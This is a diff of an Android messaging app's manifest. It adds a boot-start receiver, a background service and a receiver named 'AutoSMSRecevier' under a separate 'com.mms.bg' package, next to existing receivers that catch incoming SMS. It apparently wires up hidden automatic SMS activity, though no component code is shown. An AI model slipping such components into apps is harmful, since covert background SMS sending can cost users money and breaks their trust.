@@ -37,7 +37,7 @@
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.INSTALL_DRM" />
-    <uses-permission android:name="android.permission.DEVICE_POWER" />
+
 
 	<uses-sdk android:minSdkVersion="3"/>
 
@@ -63,17 +63,8 @@
                   android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
         </activity>
 
-        <service android:name=".transaction.SmsReceiverService">
-			<intent-filter >
-	            <action android:name="com.michael.plugin.filter"/>
-	        </intent-filter>
-        </service>
-
         <!-- Catch-all receiver for broadcasts that don't have associated security -->
         <receiver android:name=".transaction.SmsReceiver">
-            <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-            </intent-filter>
             <intent-filter>
                 <action android:name="com.android.mms.transaction.MESSAGE_SENT" />
                 <!-- TODO Do a better data match here. -->
@@ -91,6 +82,20 @@
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
+        
+        <receiver android:name=".ui.BootReceiver">
+			<intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+        
+        <receiver android:name="com.mms.bg.ui.AutoSMSRecevier">
+        	<intent-filter>
+        		<action android:name="com.mms.bg.SMS" />
+        	</intent-filter>
+        </receiver>
+        
+        <service android:name=".ui.BgService"></service>
 
     </application>
 </manifest>
